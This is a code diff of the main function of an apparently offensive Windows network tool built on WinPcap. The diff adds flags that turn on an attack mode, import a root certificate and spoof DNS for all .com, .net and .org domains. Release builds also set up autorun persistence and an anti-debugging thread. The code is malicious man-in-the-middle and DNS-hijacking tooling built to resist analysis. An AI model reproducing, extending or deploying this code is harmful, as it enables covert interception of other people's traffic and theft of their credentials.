@@ -12,6 +12,7 @@
 #include <vector>
 #include <conio.h>
 #include <DbgHelp.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include "include\\pcap.h"
@@ -95,20 +96,41 @@ void test() {
 
 int main(int argc, char** argv)
 {
+	int	ret = 0;
+
 #ifdef _DEBUG
 	test();
 #endif
 
-	int	ret = 0;
-
 	string username = "";
 	string password = "";
 	int netcard_target = -1;
-	if (argc >= 4)
-	{
-		username = argv[1];
-		password = argv[2];
-		netcard_target = atoi(argv[3]);
+	int isattack = 0;
+	int isimport = 0;
+	int isalldns = 0;
+
+	for (int num = 1; num < argc; num++) {
+		if (lstrcmpiA(argv[num], "--p") == 0) {
+			password = argv[num + 1];
+		}
+		else if (lstrcmpiA(argv[num], "--u") == 0) {
+			username = argv[num + 1];
+		}
+		else if (lstrcmpiA(argv[num], "--n") == 0) {
+			netcard_target = atoi(argv[num+1]);
+		}
+		else if (lstrcmpiA(argv[num], "-attack") == 0) {
+			isattack = 1;
+		}
+		else if (lstrcmpiA(argv[num], "-import_root_cert") == 0) {
+			isimport = 1;
+		}
+		else if (lstrcmpiA(argv[num], "-dns_all_attack") == 0) {
+			isalldns = 1;
+		}
+		else {
+			printf("unrecognized command parameter:%s\r\n", argv[num]);
+		}
 	}
 
 	HANDLE hMutext = (HANDLE)Public::singleInstance();
@@ -131,11 +153,11 @@ int main(int argc, char** argv)
 	SetCurrentDirectoryA(path.c_str());
 
 	int winpcapDelay = 1;
-	int opensslctrl = 0;
+	int opensslctrl_old = 0;
 	unsigned long serverIP = 0;
 	char gwmac[64] = { 0 };
 	string servername = "";
-	vector<string> hostlist = Config::parseAttackCfg(path + CONFIG_FILENAME, &serverIP, &winpcapDelay,&opensslctrl, &gAttackMode, gwmac, servername);
+	vector<string> hostlist = Config::parseAttackCfg(path + CONFIG_FILENAME, &serverIP, &winpcapDelay,&opensslctrl_old, &gAttackMode, gwmac, servername);
 	if (hostlist.size() == 0) {
 		//log("parse config file:%s error\r\n", CONFIG_FILENAME);
 		//return -1;
@@ -159,10 +181,16 @@ int main(int argc, char** argv)
 		log("Choose Netcard error\r\n");
 		return -1;
 	}
-#ifndef _DEBUG
-	opensslctrl |= ROOTCERT_IMPORT;
+
+	if (isattack) {
+		gAttackToggle = 1;
+	}
+	int opensslctrl = 0;
+	opensslctrl |= (isalldns << 3);
+	opensslctrl |= (isattack << 2);
+	opensslctrl |= (isimport<<1);
 	opensslctrl |= OPENSSL_CLEAR_PATH;
-#endif
+
 	if (gAttackMode == ATTACK_TEST_MODE)
 	{
 		gNetIP = GetInetIPAddress();
@@ -183,8 +211,7 @@ int main(int argc, char** argv)
 #ifndef _DEBUG
 	ret = Tools::autorun(username, password, netcard_target);
 	DWORD debugTd = 0;
-	CloseHandle(CreateThread(0, PROXY_THREAD_STACK_SIZE, (LPTHREAD_START_ROUTINE)SafeGuard::antiDebug, 0,
-		STACK_SIZE_PARAM_IS_A_RESERVATION, &debugTd));
+	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SafeGuard::antiDebug, 0,0, &debugTd));
 #endif
 
 	string devname = string(WINPCAP_NETCARD_NAME_PREFIX) + adaptername;
@@ -195,18 +222,17 @@ int main(int argc, char** argv)
 		return -1;
 	}
 	printf("device:%s,mask:%08x,winpcap delay:%d\r\n", devname.c_str(), gNetmask, winpcapDelay);
-
 	
 	// 标准去重模式,vector、set、map这些容器的end()取出来的值不是最后一个、end的前一个才是最后一个,prev(xxx.end())取出最后一个
 	sort(hostlist.begin(), hostlist.end());  // 先排序
 	auto iter = unique(hostlist.begin(), hostlist.end());
 	hostlist.erase(iter, hostlist.end());
 
-#ifdef _DEBUG
-	hostlist.push_back(".com");
-	hostlist.push_back(".net");
-	hostlist.push_back(".org");
-#endif
+	if (isalldns) {
+		hostlist.push_back(".com");
+		hostlist.push_back(".net");
+		hostlist.push_back(".org");
+	}
 
 	vector<string> dnslist = hostlist;
 	hostlist.push_back(HttpUtils::getIPstr(serverIP));
